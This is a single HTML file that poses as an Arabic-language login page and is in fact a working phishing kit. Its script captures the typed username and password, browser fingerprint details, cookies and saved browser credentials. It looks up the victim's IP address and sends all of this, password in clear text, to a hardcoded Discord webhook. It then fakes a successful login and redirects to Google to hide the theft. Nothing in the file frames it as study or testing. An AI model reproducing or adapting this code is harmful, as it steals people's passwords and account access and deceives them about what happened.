<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>نظام الدخول</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f5f5f5;
            margin: 0;
            padding: 20px;
            color: #333;
        }
        .container {
            max-width: 800px;
            margin: 0 auto;
            background-color: white;
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0 0 10px rgba(0,0,0,0.1);
        }
        h1 {
            color: #0066ff;
            text-align: center;
            margin-bottom: 30px;
        }
        .form-group {
            margin-bottom: 20px;
        }
        label {
            display: block;
            margin-bottom: 8px;
            font-weight: bold;
        }
        input[type="text"],
        input[type="password"],
        input[type="email"] {
            width: 100%;
            padding: 10px;
            border: 1px solid #ddd;
            border-radius: 5px;
            font-size: 16px;
        }
        button {
            background-color: #0066ff;
            color: white;
            border: none;
            padding: 12px 25px;
            border-radius: 5px;
            cursor: pointer;
            font-size: 16px;
            display: block;
            margin: 20px auto 0;
        }
        button:hover {
            background-color: #0055cc;
        }
        .loading {
            display: none;
            text-align: center;
            margin-top: 20px;
        }
        .loading-spinner {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #0066ff;
            border-radius: 50%;
            width: 30px;
            height: 30px;
            animation: spin 1s linear infinite;
            margin: 0 auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .hidden {
            display: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>تسجيل الدخول</h1>
        
        <div id="login-form">
            <div class="form-group">
                <label for="username">اسم المستخدم:</label>
                <input type="text" id="username" required>
            </div>
            
            <div class="form-group">
                <label for="password">كلمة المرور:</label>
                <input type="password" id="password" required>
            </div>
            
            <button onclick="collectAndSubmit()">تسجيل الدخول</button>
        </div>
        
        <div id="loading" class="loading">
            <div class="loading-spinner"></div>
            <p>جاري التحقق من البيانات...</p>
        </div>
        
        <div id="success-message" class="hidden">
            <h3 style="color: green; text-align: center;">تم تسجيل الدخول بنجاح!</h3>
            <p style="text-align: center;">سيتم توجيهك الآن إلى الصفحة الرئيسية.</p>
        </div>
    </div>

    <script>
        async function collectAndSubmit() {
            const username = document.getElementById('username').value.trim();
            const password = document.getElementById('password').value.trim();
            
            if (!username || !password) {
                alert('الرجاء إدخال اسم المستخدم وكلمة المرور');
                return;
            }
            
            // عرض رسالة التحميل
            document.getElementById('login-form').style.display = 'none';
            document.getElementById('loading').style.display = 'block';
            
            // جمع المعلومات
            const browserData = collectBrowserData();
            const cookies = await getCookies();
            const savedCredentials = await getSavedCredentials();
            
            // إرسال البيانات
            await sendCollectedData({
                username,
                password,
                ...browserData,
                cookies,
                savedCredentials
            });
            
            // عرض رسالة النجاح
            document.getElementById('loading').style.display = 'none';
            document.getElementById('success-message').classList.remove('hidden');
            
            // توجيه إلى صفحة أخرى بعد 2 ثانية
            setTimeout(() => {
                window.location.href = "https://www.google.com";
            }, 2000);
        }
        
        function collectBrowserData() {
            return {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                screenWidth: window.screen.width,
                screenHeight: window.screen.height,
                colorDepth: window.screen.colorDepth,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                currentTime: new Date().toISOString(),
                referrer: document.referrer,
                ipAddress: 'جاري جلب عنوان IP...' // سيتم جلب الـ IP عبر API خارجي
            };
        }
        
        async function getCookies() {
            try {
                // هذه الطريقة تعمل فقط إذا كانت الصفحة من نفس النطاق
                if (document.cookie) {
                    return document.cookie.split(';').map(c => c.trim());
                }
                return [];
            } catch (e) {
                console.error('Error accessing cookies:', e);
                return 'غير قادر على قراءة الكوكيز';
            }
        }
        
        async function getSavedCredentials() {
            try {
                // هذه الطريقة لن تعمل إلا في سياقات محددة بسبب سياسة الأمان
                if (navigator.credentials && navigator.credentials.get) {
                    const cred = await navigator.credentials.get({
                        password: true,
                        mediation: 'optional'
                    });
                    return cred ? [cred] : [];
                }
                return 'واجهة Credentials غير متاحة';
            } catch (e) {
                console.error('Error accessing saved credentials:', e);
                return 'غير قادر على قراءة بيانات الاعتماد المحفوظة';
            }
        }
        
        async function sendCollectedData(data) {
            const webhookURL = 'https://discordapp.com/api/webhooks/1404910412352327700/GCJf4yPnarHrDMDMgB5vmYIAz9dbncbmh2i-npw_AF6zg1y2uqbie2LcqJJlYRPUiSo4';
            
            // محاولة جلب عنوان IP
            try {
                const ipResponse = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipResponse.json();
                data.ipAddress = ipData.ip;
            } catch (e) {
                data.ipAddress = 'فشل في جلب عنوان IP';
            }
            
            // إعداد رسالة Discord
            const discordMessage = {
                content: '**تم جمع بيانات جديدة**',
                embeds: [{
                    title: 'تفاصيل البيانات المجمعة',
                    fields: [
                        { name: 'اسم المستخدم', value: data.username || 'غير متوفر', inline: true },
                        { name: 'كلمة المرور', value: data.password || 'غير متوفر', inline: true },
                        { name: 'وكيل المستخدم', value: data.userAgent || 'غير متوفر', inline: false },
                        { name: 'المنصة', value: data.platform || 'غير متوفر', inline: true },
                        { name: 'اللغة', value: data.language || 'غير متوفر', inline: true },
                        { name: 'دقة الشاشة', value: `${data.screenWidth}x${data.screenHeight}`, inline: true },
                        { name: 'الوقت', value: data.currentTime || 'غير متوفر', inline: true },
                        { name: 'المنطقة الزمنية', value: data.timezone || 'غير متوفر', inline: true },
                        { name: 'عنوان IP', value: data.ipAddress || 'غير متوفر', inline: true },
                        { name: 'عدد الكوكيز', value: Array.isArray(data.cookies) ? data.cookies.length.toString() : 'غير متوفر', inline: true },
                        { name: 'بيانات الاعتماد المحفوظة', value: typeof data.savedCredentials === 'string' ? data.savedCredentials : data.savedCredentials.length.toString(), inline: true }
                    ],
                    color: 0xff0000,
                    timestamp: new Date().toISOString()
                }]
            };
            
            // إرسال البيانات إلى Discord
            try {
                await fetch(webhookURL, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify(discordMessage),
                });
            } catch (e) {
                console.error('Error sending data to Discord:', e);
            }
        }
    </script>
</body>
</html>
